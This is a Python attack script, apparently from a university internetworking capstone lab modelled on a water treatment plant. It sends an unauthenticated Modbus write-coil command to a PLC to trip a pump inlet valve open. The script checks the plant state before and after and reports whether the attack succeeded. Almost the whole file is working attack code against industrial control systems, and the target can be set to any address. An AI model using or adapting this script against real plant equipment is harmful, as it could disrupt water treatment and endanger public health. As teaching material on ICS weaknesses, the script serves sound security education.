#!/usr/bin/env python3
"""
Goulburn Water Treatment Plant -- Scenario 2: Command Injection
================================================================
Issues an unauthenticated FC5 Write Single Coil to trip the inlet valve
on PLC-PUMP1 (plc1): coil 0 (pump1-valve.closed) from True (CLOSED)
to False (OPEN), de-energising the pump inlet valve.

Prints a full 12-byte Modbus TCP ADU breakdown before executing.

Real-world impact:
  pump1-valve tripped OPEN -- pump inlet valve de-energised,
  flow on pump1 line interrupted.

Usage:
    python3 scenario2_command_injection.py [--target 10.0.0.2] [--port 5502]
"""

import argparse
import struct
import sys
import time
from datetime import datetime

from pymodbus.client import ModbusTcpClient
from pymodbus.exceptions import ModbusException


# ---------------------------------------------------------------------------
# Argument parsing
# ---------------------------------------------------------------------------
def parse_args():
    parser = argparse.ArgumentParser(description="Modbus command injection attack")
    parser.add_argument("--target", default="10.0.0.2", help="Target IP (default: 10.0.0.2)")
    parser.add_argument("--port", type=int, default=5502, help="Target port (default: 5502)")
    return parser.parse_args()


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------
def separator(char="-", width=60):
    print(char * width)


def read_coil(client, address):
    try:
        r = client.read_coils(address, count=1, device_id=1)
        if r.isError():
            return None
        return r.bits[0]
    except Exception:
        return None


def read_hr(client, address):
    """address is full Modbus address (30000-based); pymodbus 3.x takes it directly."""
    try:
        r = client.read_holding_registers(address, count=1, device_id=1)
        if r.isError():
            return None
        return r.registers[0]
    except Exception:
        return None


def coil_state_str(val):
    if val is True:
        return "True  (CLOSED -- valve energised, flow normal)"
    if val is False:
        return "False (OPEN  -- valve de-energised, flow interrupted)"
    return f"{val} (read failed)"


# ---------------------------------------------------------------------------
# Full 12-byte Modbus TCP ADU breakdown
# ---------------------------------------------------------------------------
def print_fc5_frame(coil_address, value):
    """Print and explain the raw 12-byte Modbus TCP Application Data Unit for FC5."""
    # FC5 coil value encoding: 0xFF00 = True (ON/CLOSED), 0x0000 = False (OFF/OPEN)
    coil_val_word = 0xFF00 if value else 0x0000

    # PDU: FC(1) + coil_addr(2) + coil_value(2) = 5 bytes
    pdu = struct.pack(">BHH", 0x05, coil_address, coil_val_word)

    # MBAP header: TransactionID(2) + ProtocolID(2) + Length(2) + UnitID(1) = 7 bytes
    transaction_id = 0x0001
    protocol_id    = 0x0000
    length         = len(pdu) + 1   # includes UnitID byte
    unit_id        = 0x01

    mbap       = struct.pack(">HHHB", transaction_id, protocol_id, length, unit_id)
    full_frame = mbap + pdu        # total = 12 bytes

    print("\n[*] Modbus TCP ADU Breakdown (FC5 Write Single Coil) -- 12 bytes")
    separator()
    print(f"  Full frame (hex): {full_frame.hex(' ').upper()}")
    separator()
    print(f"  {'Field':<25} {'Bytes':<12} {'Dec':<10} Meaning")
    separator("-", 70)

    rows = [
        ("Transaction ID",  f"{transaction_id:04X}",  str(transaction_id),  "Identifies this request"),
        ("Protocol ID",     f"{protocol_id:04X}",     "0",                  "Always 0 for Modbus TCP"),
        ("Length",          f"{length:04X}",           str(length),          f"Bytes remaining ({length})"),
        ("Unit ID",         f"{unit_id:02X}",          str(unit_id),         "Slave / device address 1"),
        ("Function Code",   "05",                      "5 (FC5)",            "Write Single Coil"),
        ("Coil Address",    f"{coil_address:04X}",     str(coil_address),    f"Coil {coil_address} (pump1-valve.closed)"),
        ("Coil Value",      f"{coil_val_word:04X}",    "0xFF00=ON/0=OFF",    "0xFF00=CLOSED  0x0000=OPEN"),
    ]

    for name, hex_val, dec_val, meaning in rows:
        print(f"  {name:<25} {hex_val:<12} {dec_val:<10} {meaning}")
    separator()

    target_state = "True (CLOSED)" if value else "False (OPEN)"
    print(f"  Intent: set coil {coil_address} (pump1-valve.closed) to {target_state}")
    print()


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------
def main():
    args = parse_args()

    print("=" * 62)
    print("  Goulburn WTP -- Scenario 2: Command Injection")
    print("  AquaOps Utilities | 31261 Internetworking Capstone (UTS)")
    print(f"  Target: {args.target}:{args.port}")
    print(f"  Time:   {datetime.now().strftime('%Y-%m-%dT%H:%M:%S')}")
    print("=" * 62)

    client = ModbusTcpClient(args.target, port=args.port)
    if not client.connect():
        print(f"[!] Failed to connect to {args.target}:{args.port}")
        sys.exit(1)

    print(f"[+] Connected to {args.target}:{args.port}")

    # -----------------------------------------------------------------------
    # Pre-attack state
    # -----------------------------------------------------------------------
    print("\n[*] Pre-attack state:")
    separator()
    coil0_before  = read_coil(client, 0)
    coil1_before  = read_coil(client, 1)
    hr30000_before = read_hr(client, 30000)
    hr30001_before = read_hr(client, 30001)

    print(f"  Coil 0  (pump1-valve.closed): {coil_state_str(coil0_before)}")
    print(f"  Coil 1  (pump2-valve.closed): {coil_state_str(coil1_before)}")
    print(f"  HR 30000 (pump1-flow.Lps):     {hr30000_before}")
    print(f"  HR 30001 (pump2-flow.Lps):     {hr30001_before}")

    # -----------------------------------------------------------------------
    # Frame breakdown
    # -----------------------------------------------------------------------
    print_fc5_frame(coil_address=0, value=False)

    # -----------------------------------------------------------------------
    # Execute attack: FC5 Write coil 0 = False (OPEN)
    # -----------------------------------------------------------------------
    attack_time = datetime.now().strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3]
    print(f"[!] Sending FC5 Write Coil 0 = False (OPEN) at {attack_time}")

    try:
        result = client.write_coil(0, False, device_id=1)
        attack_ok = not result.isError()
    except Exception as e:
        attack_ok = False
        print(f"[!] Exception during write: {e}")

    time.sleep(0.5)

    # -----------------------------------------------------------------------
    # Post-attack state
    # -----------------------------------------------------------------------
    print("\n[*] Post-attack state:")
    separator()
    coil0_after  = read_coil(client, 0)
    coil1_after  = read_coil(client, 1)
    hr30000_after = read_hr(client, 30000)
    hr30001_after = read_hr(client, 30001)

    print(f"  Coil 0  (pump1-valve.closed): {coil_state_str(coil0_after)}")
    print(f"  Coil 1  (pump2-valve.closed): {coil_state_str(coil1_after)}")
    print(f"  HR 30000 (pump1-flow.Lps):     {hr30000_after}")
    print(f"  HR 30001 (pump2-flow.Lps):     {hr30001_after}")

    client.close()

    # -----------------------------------------------------------------------
    # Before / After comparison
    # -----------------------------------------------------------------------
    print("\n[*] Before / After Comparison")
    separator("=", 62)
    print(f"  {'Tag':<32} {'Before':<20} {'After'}")
    separator("-", 62)
    print(f"  {'pump1-valve.closed (Coil 0)':<32} {str(coil0_before):<20} {str(coil0_after)}")
    print(f"  {'pump2-valve.closed (Coil 1)':<32} {str(coil1_before):<20} {str(coil1_after)}")
    print(f"  {'pump1-flow.Lps     (HR 30000)':<32} {str(hr30000_before):<20} {str(hr30000_after)}")
    print(f"  {'pump2-flow.Lps     (HR 30001)':<32} {str(hr30001_before):<20} {str(hr30001_after)}")
    separator("=", 62)

    # -----------------------------------------------------------------------
    # Verdict
    # -----------------------------------------------------------------------
    print()
    coil_changed = (coil0_before is True and coil0_after is False)
    if attack_ok and coil_changed:
        print("  *** ATTACK SUCCESSFUL ***")
        print("  pump1-valve tripped OPEN -- pump inlet valve de-energised,")
        print("  flow on pump1 line interrupted.")
        print("  In a real water treatment plant this would halt disinfection")
        print("  dosing and could allow untreated water into the supply network.")
    elif attack_ok and not coil_changed:
        print("  *** ATTACK FAILED ***")
        print(f"  Reason: write_coil() returned success but coil 0 read back as {coil0_after}.")
        print("  Possible cause: server-side validation or address mismatch.")
    else:
        print("  *** ATTACK FAILED ***")
        print("  Reason: write_coil() returned an error response.")
    print()


if __name__ == "__main__":
    main()
